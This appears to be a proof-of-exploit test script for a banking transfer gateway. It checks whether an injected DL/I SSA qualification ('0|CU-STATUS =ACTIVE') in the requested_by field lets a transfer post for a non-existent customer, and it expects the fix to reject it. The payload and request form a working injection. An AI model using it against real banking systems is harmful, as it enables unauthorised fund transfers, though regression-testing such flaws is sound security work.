"""LG-DLII-001 proof-of-exploit: DL/I SSA injection in the core transfer's customer validation.

Posts a transfer whose requested_by names a NON-EXISTENT customer id but carries an injected OR
qualification (0|CU-STATUS =ACTIVE). With alnum_customer_ids=on this is spliced into the CUSTSEG SSA
raw, so the DL/I GU matches any ACTIVE customer and the existence check is bypassed: the transfer
POSTs. Fires when status=POSTED for a bogus requested_by. With the fix the numeric guard rejects it
(CUSTOMER NOT FOUND). Uses valid accounts (42/43) so only the customer check is in question.
Env: GATEWAY_URL.
"""

from harness import env, http


def fire():
    reply = http.post_json(
        f"{env.url('GATEWAY_URL')}/transfer",
        {"token": "TRIGGERTOKEN0001", "from_account": "000000000042", "to_account": "000000000043",
         "amount": "10.00", "currency": "USD", "requested_by": "0|CU-STATUS =ACTIVE"},
        headers={"X-Staff-Id": "TLR001", "X-Role": "TELLER", "X-Branch": "0007"},
    )
    reply_json = reply.json()
    if reply_json.get("status") == "POSTED":
        return True, f"SSA injection bypassed customer validation, transfer POSTED -> {reply.text}"
    return False, f"status={reply_json.get('status')} reason={reply_json.get('reason') or ''} ({reply.text})"
